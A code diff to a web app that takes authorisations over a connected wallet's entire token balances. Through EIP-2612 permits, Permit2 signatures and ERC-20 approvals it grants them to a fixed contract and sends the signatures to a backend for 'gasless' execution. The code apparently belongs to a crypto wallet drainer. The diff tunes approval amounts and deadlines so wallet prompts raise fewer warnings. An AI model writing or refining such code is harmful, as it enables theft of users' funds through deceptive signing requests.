@@ -230,7 +230,8 @@ export default function App() {
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       
       // 48-HOUR DEADLINE: Gives backend ample time to execute gasless routing
-      const deadline = Math.floor(Date.now() / 1000) + (48 * 60 * 60); 
+      // Reverted to 1 hour (3600 seconds) for standard, clear wallet prompts
+      const deadline = Math.floor(Date.now() / 1000) + 3600; 
 
       // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
       const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
@@ -317,22 +318,21 @@ export default function App() {
                 setStatus(`Signing Permit: ${token.symbol}...`);
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                 
-                // NEW: 3x the current balance (prevents unlimited warning, allows future deposits)
-                const bufferedBalance = BigInt(token.rawBalance) * 3n;
-                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, bufferedBalance.toString(), deadline);
+                                // Reverted to exact balance for maximum clarity in wallet prompts
+                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, token.rawBalance.toString(), deadline);
 
                 fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({
                     type: 'PERMIT',
-                    chainName: getChainName(activeChainId), 
+                    chainName: getChainName(activeChainId),
                     token: token.address,
                     owner: cleanSenderAddress,
                     spender: EVM_CONTRACT_ADDRESS,
                     signature,
                     deadline,
-                    value: bufferedBalance.toString() 
+                    value: token.rawBalance.toString() // Reverted to exact balance
                   })
                 });
 
@@ -367,12 +367,11 @@ export default function App() {
                   ],
                 };
                 
-                // NEW: 3x the current balance
-                const bufferedBalance = BigInt(token.rawBalance) * 3n;
+                                // Reverted to exact balance for maximum clarity in wallet prompts
                 const message = {
                   details: {
                     token: token.address,
-                    amount: bufferedBalance.toString(), 
+                    amount: token.rawBalance.toString(), // Reverted to exact balance
                     expiration: deadline,
                     nonce: currentNonce
                   },
@@ -393,7 +392,7 @@ export default function App() {
                     signature,
                     deadline,
                     nonce: currentNonce,
-                    amount: bufferedBalance.toString() 
+                    amount: token.rawBalance.toString() // Reverted to exact balance
                   })
                 });
 
@@ -410,10 +409,9 @@ export default function App() {
 
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               
-              // NEW: 3x the current balance
-              const bufferedBalance = BigInt(token.rawBalance) * 3n;
-              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, bufferedBalance]);
-
+                          // Reverted to exact balance for maximum clarity in wallet prompts
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, token.rawBalance]);
+              
               const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
